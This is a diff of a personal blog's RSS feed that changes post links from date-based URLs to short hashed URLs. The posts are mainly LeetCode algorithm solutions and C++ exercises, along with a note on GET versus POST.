-            <link>http://dpm12345.github.io/2021/12/26/leetcode/regular-exercise/%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</link>
+            <link>http://dpm12345.github.io/posts/4a8b7903/</link>
             <category>贪心</category>
             <category>括号</category>
             <pubDate>Sun, 26 Dec 2021 10:20:40 +0800</pubDate>
@@ -7070,9 +7070,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/24/leetcode/regular-exercise/%E5%85%A8%E6%8E%92%E5%88%97/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/12ad1f11/</guid>
             <title>全排列</title>
-            <link>http://dpm12345.github.io/2021/12/24/leetcode/regular-exercise/%E5%85%A8%E6%8E%92%E5%88%97/</link>
+            <link>http://dpm12345.github.io/posts/12ad1f11/</link>
             <category>递归</category>
             <pubDate>Fri, 24 Dec 2021 09:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;无重复数字的全排列&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无重复数字的全排列&#34;&gt;#&lt;/a&gt; 无重复数字的全排列&lt;/h1&gt;
@@ -7136,9 +7136,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/19/leetcode/week-competition/leetcode%20%E7%AC%AC%20272%20%E5%9C%BA%E5%91%A8%E8%B5%9B/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/415dc2d2/</guid>
             <title>leetcode 第 272 场周赛</title>
-            <link>http://dpm12345.github.io/2021/12/19/leetcode/week-competition/leetcode%20%E7%AC%AC%20272%20%E5%9C%BA%E5%91%A8%E8%B5%9B/</link>
+            <link>http://dpm12345.github.io/posts/415dc2d2/</link>
             <pubDate>Sun, 19 Dec 2021 23:20:34 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;【战绩】&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;/%E7%B4%A0%E6%9D%90/leetcode%E7%AC%AC272%E5%9C%BA%E5%91%A8%E8%B5%9B_%E6%88%98%E7%BB%A9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
@@ -7372,9 +7372,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/17/leetcode/regular-exercise/%E6%8D%A2%E9%85%92%E9%97%AE%E9%A2%98/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/3b3e846/</guid>
             <title>换酒问题</title>
-            <link>http://dpm12345.github.io/2021/12/17/leetcode/regular-exercise/%E6%8D%A2%E9%85%92%E9%97%AE%E9%A2%98/</link>
+            <link>http://dpm12345.github.io/posts/3b3e846/</link>
             <pubDate>Fri, 17 Dec 2021 14:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvd2F0ZXItYm90dGxlcy8=&#34;&gt; 换酒问题&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;题目详情:&lt;/p&gt;
@@ -7409,9 +7409,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/12/leetcode/week-competition/leetcode%20%E7%AC%AC%20271%20%E5%9C%BA%E5%91%A8%E8%B5%9B/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/d8bfa4d3/</guid>
             <title>leetcode 第 271 场周赛</title>
-            <link>http://dpm12345.github.io/2021/12/12/leetcode/week-competition/leetcode%20%E7%AC%AC%20271%20%E5%9C%BA%E5%91%A8%E8%B5%9B/</link>
+            <link>http://dpm12345.github.io/posts/d8bfa4d3/</link>
             <pubDate>Sun, 12 Dec 2021 23:20:34 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;写在前面：这次是自己报名的第一场周赛，但最后忘记了有这一回事了，所以要记得给自己设个闹钟，提醒自己&lt;/p&gt;
 &lt;p&gt;弥补：虽然错过了，但题目不能不做&lt;/p&gt;
@@ -7637,9 +7637,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/09/leetcode/regular-exercise/%E5%AD%90%E5%BA%8F%E5%88%97%E9%97%AE%E9%A2%98/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/9e6e8fdc/</guid>
             <title>子序列问题</title>
-            <link>http://dpm12345.github.io/2021/12/09/leetcode/regular-exercise/%E5%AD%90%E5%BA%8F%E5%88%97%E9%97%AE%E9%A2%98/</link>
+            <link>http://dpm12345.github.io/posts/9e6e8fdc/</link>
             <category>动态规划</category>
             <category>子序列</category>
             <category>最长公共子序列</category>
@@ -7736,9 +7736,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/09/leetcode/regular-exercise/%E6%97%8B%E8%BD%AC%E5%87%BD%E6%95%B0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/ca7417e/</guid>
             <title>三个无重叠子数组的最大和</title>
-            <link>http://dpm12345.github.io/2021/12/09/leetcode/regular-exercise/%E6%97%8B%E8%BD%AC%E5%87%BD%E6%95%B0/</link>
+            <link>http://dpm12345.github.io/posts/ca7417e/</link>
             <category>动态规划</category>
             <pubDate>Thu, 09 Dec 2021 09:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcm90YXRlLWZ1bmN0aW9uLw==&#34;&gt;旋转函数&lt;/span&gt;&lt;/p&gt;
@@ -7804,11 +7804,11 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/08/leetcode/regular-exercise/%E4%B8%89%E4%B8%AA%E6%97%A0%E9%87%8D%E5%8F%A0%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/ca7417e/</guid>
             <title>三个无重叠子数组的最大和</title>
-            <link>http://dpm12345.github.io/2021/12/08/leetcode/regular-exercise/%E4%B8%89%E4%B8%AA%E6%97%A0%E9%87%8D%E5%8F%A0%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C/</link>
-            <category>前缀和</category>
+            <link>http://dpm12345.github.io/posts/ca7417e/</link>
             <category>动态规划</category>
+            <category>前缀和</category>
             <category>滑动窗口</category>
             <pubDate>Wed, 08 Dec 2021 09:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWF4aW11bS1zdW0tb2YtMy1ub24tb3ZlcmxhcHBpbmctc3ViYXJyYXlzLw==&#34;&gt; 三个无重叠子数组的最大和&lt;/span&gt;&lt;/p&gt;
@@ -8042,9 +8042,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/07/leetcode/regular-exercise/%E8%BE%B9%E7%95%8C%E7%9D%80%E8%89%B2%20%E5%B2%9B%E5%B1%BF%E6%95%B0%E9%87%8F/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/65c00a51/</guid>
             <title>边界着色 岛屿数量</title>
-            <link>http://dpm12345.github.io/2021/12/07/leetcode/regular-exercise/%E8%BE%B9%E7%95%8C%E7%9D%80%E8%89%B2%20%E5%B2%9B%E5%B1%BF%E6%95%B0%E9%87%8F/</link>
+            <link>http://dpm12345.github.io/posts/65c00a51/</link>
             <category>深度优先搜索</category>
             <category>广度优先搜索</category>
             <pubDate>Tue, 07 Dec 2021 15:54:40 +0800</pubDate>
@@ -8216,9 +8216,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/06/leetcode/regular-exercise/%E6%97%A0%E9%87%8D%E5%8F%A0%E5%8C%BA%E9%97%B4/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/5beb97b2/</guid>
             <title>无重叠区间</title>
-            <link>http://dpm12345.github.io/2021/12/06/leetcode/regular-exercise/%E6%97%A0%E9%87%8D%E5%8F%A0%E5%8C%BA%E9%97%B4/</link>
+            <link>http://dpm12345.github.io/posts/5beb97b2/</link>
             <category>队列</category>
             <category>动态规划</category>
             <pubDate>Mon, 06 Dec 2021 19:54:40 +0800</pubDate>
@@ -8284,9 +8284,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/06/GET%20%E4%B8%8E%20POST%20%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/a0b7206d/</guid>
             <title>GET 与 POST 的区别</title>
-            <link>http://dpm12345.github.io/2021/12/06/GET%20%E4%B8%8E%20POST%20%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
+            <link>http://dpm12345.github.io/posts/a0b7206d/</link>
             <pubDate>Mon, 06 Dec 2021 14:07:26 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;不同点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不同点&#34;&gt;#&lt;/a&gt; 不同点&lt;/h1&gt;
 &lt;p&gt;GET 在浏览器回退时是无害的，而 POST 会再次提交请求。&lt;/p&gt;
@@ -8310,9 +8310,9 @@ GET 和 POST 能做的事情是一样一样的。你要给 GET 加上 request bo
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/05/leetcode/regular-exercise/%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8F%20VI/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/6f1a75f/</guid>
             <title>跳跃游戏 VI</title>
-            <link>http://dpm12345.github.io/2021/12/05/leetcode/regular-exercise/%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8F%20VI/</link>
+            <link>http://dpm12345.github.io/posts/6f1a75f/</link>
             <category>队列</category>
             <category>动态规划</category>
             <pubDate>Sun, 05 Dec 2021 14:54:40 +0800</pubDate>
@@ -8382,9 +8382,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/05/leetcode/regular-exercise/%E5%BF%AB%E9%80%9F%E5%B9%82/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/20c47d09/</guid>
             <title>快速幂</title>
-            <link>http://dpm12345.github.io/2021/12/05/leetcode/regular-exercise/%E5%BF%AB%E9%80%9F%E5%B9%82/</link>
+            <link>http://dpm12345.github.io/posts/20c47d09/</link>
             <category>递归</category>
             <pubDate>Sun, 05 Dec 2021 10:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcG93eC1uLw==&#34;&gt;快速幂&lt;/span&gt;&lt;/p&gt;
@@ -8432,9 +8432,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/02/leetcode/regular-exercise/%E7%88%AC%E6%A5%BC%E6%A2%AF%E4%B8%8E%E9%9B%B6%E9%92%B1%E5%85%91%E6%8D%A2%E9%A2%98%E7%9B%AE%E5%AF%B9%E6%AF%94/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/47ade4a0/</guid>
             <title>爬楼梯与零钱兑换题目对比</title>
-            <link>http://dpm12345.github.io/2021/12/02/leetcode/regular-exercise/%E7%88%AC%E6%A5%BC%E6%A2%AF%E4%B8%8E%E9%9B%B6%E9%92%B1%E5%85%91%E6%8D%A2%E9%A2%98%E7%9B%AE%E5%AF%B9%E6%AF%94/</link>
+            <link>http://dpm12345.github.io/posts/47ade4a0/</link>
             <category>排列组合</category>
             <pubDate>Thu, 02 Dec 2021 14:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvY2xpbWJpbmctc3RhaXJzLw==&#34;&gt;爬楼梯&lt;/span&gt;&lt;/p&gt;
@@ -8562,9 +8562,9 @@ int main()
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/29/leetcode/regular-exercise/%E4%BA%8C%E7%BB%B4%E5%8C%BA%E5%9F%9F%E5%92%8C%E6%A3%80%E7%B4%A2%20-%20%E7%9F%A9%E9%98%B5%E4%B8%8D%E5%8F%AF%E5%8F%98/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/308e5841/</guid>
             <title>有效的括号</title>
-            <link>http://dpm12345.github.io/2021/11/29/leetcode/regular-exercise/%E4%BA%8C%E7%BB%B4%E5%8C%BA%E5%9F%9F%E5%92%8C%E6%A3%80%E7%B4%A2%20-%20%E7%9F%A9%E9%98%B5%E4%B8%8D%E5%8F%AF%E5%8F%98/</link>
+            <link>http://dpm12345.github.io/posts/308e5841/</link>
             <category>矩阵</category>
             <pubDate>Mon, 29 Nov 2021 20:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvcmFuZ2Utc3VtLXF1ZXJ5LTJkLWltbXV0YWJsZS8=&#34;&gt;二维区域和检索 - 矩阵不可变&lt;/span&gt;&lt;/p&gt;
@@ -8644,9 +8644,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/28/leetcode/regular-exercise/%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/308e5841/</guid>
             <title>有效的括号</title>
-            <link>http://dpm12345.github.io/2021/11/28/leetcode/regular-exercise/%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/</link>
+            <link>http://dpm12345.github.io/posts/308e5841/</link>
             <category>栈</category>
             <pubDate>Sun, 28 Nov 2021 21:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvdmFsaWQtcGFyZW50aGVzZXMv&#34;&gt;有效的括号&lt;/span&gt;&lt;/p&gt;
@@ -8682,9 +8682,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/27/leetcode/regular-exercise/%E5%8A%A0%E6%B2%B9%E7%AB%99/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/b115b06a/</guid>
             <title>加油站</title>
-            <link>http://dpm12345.github.io/2021/11/27/leetcode/regular-exercise/%E5%8A%A0%E6%B2%B9%E7%AB%99/</link>
+            <link>http://dpm12345.github.io/posts/b115b06a/</link>
             <category>贪心</category>
             <pubDate>Sat, 27 Nov 2021 14:20:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9nYXMtc3RhdGlvbi8=&#34;&gt;加油站&lt;/span&gt;&lt;/p&gt;
@@ -8766,9 +8766,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/26/leetcode/regular-exercise/%E4%B8%8B%E9%99%8D%E8%B7%AF%E5%BE%84%E6%9C%80%E5%B0%8F%E5%92%8C/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/ccc6bc8a/</guid>
             <title>下降路径最小和</title>
-            <link>http://dpm12345.github.io/2021/11/26/leetcode/regular-exercise/%E4%B8%8B%E9%99%8D%E8%B7%AF%E5%BE%84%E6%9C%80%E5%B0%8F%E5%92%8C/</link>
+            <link>http://dpm12345.github.io/posts/ccc6bc8a/</link>
             <category>动态规划</category>
             <pubDate>Fri, 26 Nov 2021 15:20:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;题目链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWluaW11bS1mYWxsaW5nLXBhdGgtc3VtLw==&#34;&gt;下降路径最小和&lt;/span&gt;&lt;/p&gt;
@@ -8848,9 +8848,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/26/leetcode/regular-exercise/%E6%91%86%E5%8A%A8%E5%BA%8F%E5%88%97/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/723dcd0c/</guid>
             <title>摆动序列</title>
-            <link>http://dpm12345.github.io/2021/11/26/leetcode/regular-exercise/%E6%91%86%E5%8A%A8%E5%BA%8F%E5%88%97/</link>
+            <link>http://dpm12345.github.io/posts/723dcd0c/</link>
             <category>动态规划</category>
             <category>贪心</category>
             <pubDate>Fri, 26 Nov 2021 10:20:40 +0800</pubDate>
@@ -8969,9 +8969,9 @@ if ((diff &amp;gt; 0 &amp;amp;&amp;amp; prevdiff &amp;lt;= 0) || (diff &amp;lt; 
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/22/leetcode/regular-exercise/%E7%AD%89%E5%B7%AE%E6%95%B0%E5%88%97%E5%88%92%E5%88%86/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/80d626cb/</guid>
             <title>等差数列划分</title>
-            <link>http://dpm12345.github.io/2021/11/22/leetcode/regular-exercise/%E7%AD%89%E5%B7%AE%E6%95%B0%E5%88%97%E5%88%92%E5%88%86/</link>
+            <link>http://dpm12345.github.io/posts/80d626cb/</link>
             <category>等差数列</category>
             <pubDate>Mon, 22 Nov 2021 15:20:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;&lt;span class=&#34;orange&#34;&gt;题目链接:&lt;/span&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYXJpdGhtZXRpYy1zbGljZXMv&#34;&gt; 等差数列划分&lt;/span&gt;&lt;/p&gt;
@@ -8998,9 +8998,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/21/leetcode/regular-exercise/%E6%95%B4%E6%95%B0%E6%8B%86%E5%88%86/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/6ba8ad80/</guid>
             <title>整数拆分</title>
-            <link>http://dpm12345.github.io/2021/11/21/leetcode/regular-exercise/%E6%95%B4%E6%95%B0%E6%8B%86%E5%88%86/</link>
+            <link>http://dpm12345.github.io/posts/6ba8ad80/</link>
             <category>滑动窗口</category>
             <category>哈希表</category>
             <category>字符串</category>
@@ -9027,9 +9027,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/19/%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/68858302/</guid>
             <title>信息输入</title>
-            <link>http://dpm12345.github.io/2021/11/19/%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5/</link>
+            <link>http://dpm12345.github.io/posts/68858302/</link>
             <pubDate>Fri, 19 Nov 2021 14:07:26 +0800</pubDate>
             <description><![CDATA[ &lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Employee&amp;#123;
 public:
@@ -9072,9 +9072,9 @@ int main()
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/19/%E5%9D%90%E6%A0%87%E8%B7%9D%E7%A6%BB/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/c9828e60/</guid>
             <title>坐标距离</title>
-            <link>http://dpm12345.github.io/2021/11/19/%E5%9D%90%E6%A0%87%E8%B7%9D%E7%A6%BB/</link>
+            <link>http://dpm12345.github.io/posts/c9828e60/</link>
             <pubDate>Fri, 19 Nov 2021 12:07:26 +0800</pubDate>
             <description><![CDATA[ &lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//在限定时间内计算两点间的距离，并核对
 #include&amp;lt;iostream&amp;gt;
@@ -9132,9 +9132,9 @@ int main()
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/11/19/%E7%9F%A9%E9%98%B5%E4%BA%8C/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/29fef1ad/</guid>
             <title>sqli-labs 练习</title>
-            <link>http://dpm12345.github.io/2021/11/19/%E7%9F%A9%E9%98%B5%E4%BA%8C/</link>
+            <link>http://dpm12345.github.io/posts/29fef1ad/</link>
             <pubDate>Fri, 19 Nov 2021 10:07:26 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;矩阵创建及转置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#矩阵创建及转置&#34;&gt;#&lt;/a&gt; 矩阵创建及转置&lt;/h1&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;iostream&amp;gt;
